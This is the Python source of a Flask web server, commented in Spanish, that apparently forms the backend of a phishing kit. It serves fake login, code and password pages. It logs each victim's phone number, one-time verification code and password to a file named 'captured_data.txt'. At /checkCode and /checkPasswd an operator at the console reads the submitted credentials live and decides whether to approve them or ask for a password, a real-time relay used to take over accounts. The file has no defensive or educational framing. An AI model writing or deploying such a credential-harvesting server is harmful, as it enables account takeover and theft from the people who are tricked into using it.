from flask import Flask, request, jsonify, send_from_directory, make_response, redirect, url_for
import os
from datetime import datetime

app = Flask(__name__)

# Configuración
app.config['STATIC_FOLDER'] = 'static'
app.config['TEMPLATES_AUTO_RELOAD'] = True
DATA_FILE = 'captured_data.txt'

def log_data(data_type, data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] {data_type}: {data}\n"
    with open(DATA_FILE, 'a', encoding='utf-8') as f:
        f.write(entry)
    print(entry.strip())

# Configuración de cabeceras para evitar caché
@app.after_request
def add_header(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '-1'
    return response

# ======================
# RUTAS PRINCIPALES
# ======================

@app.route('/')
def index():
    return redirect(url_for('serve_login'))

@app.route('/login.html')
def serve_login():
    return send_from_directory('.', 'login.html')

@app.route('/code.html')
def serve_code():
    return send_from_directory('.', 'code.html')

@app.route('/passwd.html')
def serve_passwd():
    return send_from_directory('.', 'passwd.html')

@app.route('/loginSuccess.html')
def serve_success():
    return send_from_directory('.', 'loginSuccess.html')

# ======================
# MANEJO DE EDIT MOBILE
# ======================

@app.route('/editMobile')
def handle_edit_mobile():
    mobile = request.args.get('mobile', '')
    if mobile:
        log_data("EDIT_MOBILE", f"Número editado: {mobile}")
    # Limpiar datos de sesión si es necesario
    return redirect(url_for('serve_login'))

# ======================
# API ENDPOINTS
# ======================

@app.route('/getCode', methods=['POST'])
def get_code():
    mobile = request.form.get('mobile', '')
    log_data("CODE_REQUEST", f"Número: {mobile}")
    
    return jsonify({
        "code": "10000",
        "data": {
            "codeHash": f"temp_{os.urandom(8).hex()}",
            "uuid": f"uuid_{os.urandom(4).hex()}"
        }
    })

@app.route('/checkCode', methods=['POST'])
def check_code():
    code = request.form.get('code', '')
    mobile = request.form.get('mobile', '')
    
    print(f"\nVerificación de código para: {mobile}")
    print(f"Código recibido: {code}")
    
    user_input = input("Opciones:\n1. ok (aprobado)\n2. pass (solicitar contraseña)\n3. rechazar\n\nElección: ").strip().lower()
    
    if user_input == 'ok':
        log_data("CODE_APPROVED", mobile)
        return jsonify({
            "code": "10000",
            "data": {"url": "/loginSuccess.html"}
        })
    elif user_input == 'pass':
        log_data("PASSWORD_REQUIRED", mobile)
        return jsonify({
            "code": "666",
            "msg": "Se requiere verificación por contraseña"
        })
    else:
        log_data("CODE_REJECTED", mobile)
        return jsonify({
            "code": "99999",
            "msg": "Código incorrecto"
        })

@app.route('/checkPasswd', methods=['POST'])
def check_password():
    password = request.form.get('passwd', '')
    mobile = request.form.get('mobile', '')
    
    print(f"\nVerificación para: {mobile}")
    print(f"Contraseña recibida: {password if password else '[vacía]'}")
    
    user_input = input("Aprobar? (ok/rechazar): ").strip().lower()
    
    if user_input == 'ok':
        log_data("PASSWORD_APPROVED", mobile)
        return jsonify({
            "code": "10000",
            "data": {"url": "/loginSuccess.html"}
        })
    else:
        log_data("PASSWORD_REJECTED", mobile)
        return jsonify({
            "code": "66666",
            "msg": "Contraseña incorrecta"
        })

@app.route('/reset')
def reset():
    return """
    <script>
        localStorage.clear();
        alert("Sesión reseteada");
        window.location.href = "/";
    </script>
    """

# ======================
# SERVIR ARCHIVOS ESTÁTICOS
# ======================

@app.route('/static/<path:filename>')
def serve_static(filename):
    response = make_response(send_from_directory(app.config['STATIC_FOLDER'], filename))
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return response

# ======================
# INICIALIZACIÓN
# ======================

if __name__ == '__main__':
    # Crear directorios necesarios
    os.makedirs('static', exist_ok=True)
    os.makedirs('static/img', exist_ok=True)
    os.makedirs('static/plugins', exist_ok=True)
    os.makedirs('static/fonts', exist_ok=True)
    
    print("\n Servidor listo")
    print("Accede a http://localhost:port")
    print("Presiona Ctrl+C para detener\n")
    
    app.run(host='0.0.0.0', port=65535, debug=True)
